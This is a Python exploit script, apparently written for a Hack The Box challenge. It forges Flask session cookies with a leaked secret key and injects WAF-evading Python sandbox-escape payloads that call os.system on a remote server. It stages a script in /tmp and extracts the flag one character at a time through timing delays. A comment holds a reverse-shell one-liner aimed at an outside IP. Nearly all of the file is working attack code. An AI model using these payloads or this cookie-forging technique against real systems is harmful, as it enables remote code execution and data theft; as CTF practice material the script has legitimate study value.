from session_cookie_manager import FSCM
import json
import sys
import subprocess
import math

import requests

import string
import time

url = "http://localhost:1337"
url = "http://192.168.1.106:1337"
url = "http://143.110.170.91:32681/"

# org secret code avaible on url/debug
secret = "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw"

def clipboard_copy(_str_to_copy):
    if sys.platform == 'win32' or sys.platform == 'cygwin':
        subprocess.Popen(['clip'], stdin=subprocess.PIPE).communicate(_str_to_copy)
    else:
        raise Exception('Platform not supported')

def payload_hard_flask(syntax, escape=0, converted=0):
	final = hf_loop_converter(syntax)
	payload = 'a=""\n'
	payload += 'for i in {}:'.format(final)

	payload += '\n\t'
	payload += 'try:'
	payload += '\n\t\t'
	payload += 'a+="%c"%i'
	payload += '\n\t' 
	payload += 'except:' 
	payload += '\n\t\t'
	payload += 'a+="%s"%i'
	payload += '\n'
	payload += 'exec a#'
	if escape:
		import re
		payload = ''.join(list(map(escaper, payload)))
	return payload

def hf_loop_converter(syntax):
	'''
	Modify waf blocked syntax to numbers and for loop sequence.
	'''
	full_str = ""
	beg = []
	# print("syntax", syntax)
	for i in syntax:
		if i in ["(", "[", ".", "_", "\n"]:
			if full_str:
				beg.append('"{}"'.format(full_str))
				full_str = ""
			beg.append(str(ord(i)))
		else:
			full_str += str(i)

	# That way of returning result is fucked up; (not works only for (") quotes!) 
	# goes crazy if it apporach nested quotes eg. '""'.
	result = r','.join(beg) + ',"{}"'.format(full_str)

	return result

def make_request(data_cookies):
	# x = requests.Session() # no-need
	r = requests.get(url=url, cookies=data_cookies)
	return r.text

def req_syntax_splitter(data, _size=14, prefix=r'echo -n ', sufix=r'>>b'):
	n = len(data)
	splitted_list = []

	_size -= len(prefix) + len(sufix)
	_range = int(math.ceil(n/_size) + 1)
	for i in data:
		# optimization check 
		if i in ["(", "[", ".", "_"]:
			splitted_list.append(r'{0}-n {1}{2}'.format(prefix.replace(" -n", ""), i, sufix))
		# changed to raw string!
		elif i in tuple('"'):
			splitted_list.append(r'{0}\\\\\{1}{2}'.format(prefix, i, sufix))
		elif i in tuple("'"):
			splitted_list.append(r"{0}\\\\\\{1}{2}".format(prefix, i, sufix))
		elif i in tuple("\n"):
			splitted_list.append(r'{0} {2}'.format(prefix.replace("-n", ""), i, sufix))
		elif i in tuple("\t"):
			splitted_list.append(r'{0}\" \"{2}'.format(prefix, i, sufix))
			splitted_list.append(r'{0}\" \"{2}'.format(prefix, i, sufix))
		else:
			splitted_list.append(r'{0}\"{1}\"{2}'.format(prefix, i, sufix))
	return splitted_list


def exploit(statement="", pos=0):
	

	# chdir to /tmp
	payload_begin = r"().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').chdir(\'" 
	payload_end = r"')"
	query = '/tmp'
	hf_single_query(query, payload_begin, payload_end)

	# if there is b file - remove it
	payload_begin = r"().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system(\'" 
	query = 'rm b'
	hf_single_query(query, payload_begin, payload_end)

	# create new file "b" with following syntax
	payload_begin = r"().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('" 
	payload_end = r"')"

	# due to the fact the "payload generator" is written quotes still cannot be used
	# for that specyfic reason, intended is to write string as a int array, so that it can be joined without 
	# using quotes. so if any arg needs quotes it will require extra args to be parsed manually
	# basically what this 8 lines do, simply creates file in /tmp/b folder to further exec
	#sh -i >& /dev/udp/10.0.0.1/4242 0>&1

# 3.15.247.173:4242
	arg1 = char_to_numarray("sleep 5") # FREE-TO-USE ARG
	new_params = "import os, time" + "\n"
	new_params += "x1=" + str(arg1) + "\n"
	new_params += "x2=str().join([chr(x) for x in x1])" + "\n"
 
	arg2 = char_to_numarray("/tmp/f") # FREE-TO-USE ARG
	new_params += "x3=" + str(arg2) + "\n"
	new_params += "x4=str().join([chr(x) for x in x3])" + "\n"
	
	arg3 = char_to_numarray("{0:b}") # FREE-TO-USE ARG
	new_params += "baa=" + str(arg3) + "\n"
	new_params += "baa=str().join([chr(x) for x in baa])" + "\n"

	arg4 = char_to_numarray(".")
	new_params += "x5=" + str(arg4) + "\n"
	new_params += "x5=str().join([chr(x) for x in x5])" + "\n"
	arg5 = char_to_numarray("f")
	new_params += "x6=" + str(arg5) + "\n"
	new_params += "x6=str().join([chr(x) for x in x6])" + "\n"
	# new_params += "flag=open(x4, baa).write(str().join(os.listdir(x5)))\n"
	new_params += "flag=open(x4).read()\n"
	# new_params += "print(flag)\n"
	# new_params += "flag=open([x for x in os.listdir(x5) if x6 in x][0]).read()\n"

	if statement:
		arg6 = char_to_numarray(statement)
		new_params += "x7=" + str(arg6) + "\n"
		new_params += "x7=str().join([chr(x) for x in x7])" + "\n"

		new_params += "flagster = ord(flag[{}])\n".format(pos)
		new_params += "time.sleep(flagster*0.2)\n"


	# new_params += "os.chmod(x4, 448)\n"
	# new_params += "os.system(baa)\n"

	new_params = payload_hard_flask(new_params)
	params = new_params
	splitted_params = req_syntax_splitter(params)
	
	# request in loop (for every splitted param cuz length of payload must be lower then 300 bytes)
	request_with_split_messages(splitted_params, payload_begin, payload_end)

	# single query to change permissions of a file
	payload_begin = r"().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').chmod(\'b\',448" 
	payload_end = r")"
	query = ''
	hf_single_query(query, payload_begin, payload_end)


	# exec
	start = time.time()

	payload_begin = r"().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system(\'" 
	payload_end = r"')"
	query = 'python b'
	hf_single_query(query, payload_begin, payload_end)

	end = time.time()
	# #kill python env
	# payload_begin = r"().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system(\'" 
	# payload_end = r"')"
	# query = 'pkill python'
	# hf_single_query(query, payload_begin, payload_end)
	result = end - start

	return result


def char_to_numarray(char_string):
	arr = []
	for i in char_string:
		arr.append(ord(i))
	return arr

def request_with_split_messages(data, payload_begin, payload_end):
	for item in data:
		request_data = '{0}{1}{2}'.format(payload_begin, item, payload_end)
		payload = payload_hard_flask(request_data)
		payload_json = {'ingredient': payload , 'measurements': "x"}
		payload_json = json.dumps(payload_json)
		token = FSCM.encode(secret, payload_json)
		request = make_request({'session': token})
	return


def hf_single_query(query, payload_begin, payload_end):
	params = query
	syntax_to_payload = "{}{}{}".format(payload_begin, params, payload_end)
	payload = payload_hard_flask(syntax_to_payload)
	payload_json = {'ingredient': payload , 'measurements': "x"}
	payload_json = json.dumps(payload_json)
	token = FSCM.encode(secret, payload_json)
	request = make_request({"session": token})
	return

def main():

	# Sleep func do not work in HTB
	payload_begin = r"().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system(\'" 
	payload_end = r"')"
	query = 'cat *fla*>/tmp/f'
	hf_single_query(query, payload_begin, payload_end)


	maine = '{|}ABCDEFGHIJKLM()*+,-./abcdefghijklmnopqrstuvwxyzNOPQRSTUVWXYZ!0123456789"#$%&\':;<=>?@[\\]^_`~ '
	flag = "HTB{"
	# flag = "HTB{e1day0u_h4v3_FuN_c4lcul4t2oG_Th3_d4rK_m4tt3r?!}" not right? :)
	pos = len(flag)

	while 1:
		for index, i in enumerate(maine[60:]):
			
			print("[*] %d. Exploit exec loop.." % (index))
			try:
				result = exploit(i, pos)
			except Exception as e:
				print(e)
				time.sleep(1)
				pass

			# = todo: refactor that ugly-looking code
			real_flag = result / 0.2
			print("real_flag", real_flag)
			real_flag = int(real_flag - 0.5)
			real_flag = chr(real_flag)
			print(real_flag)
			flag += real_flag
			print("[!] Got a hit... {}".format(flag))
			pos += 1
			break
	return


if __name__ == '__main__':
	main()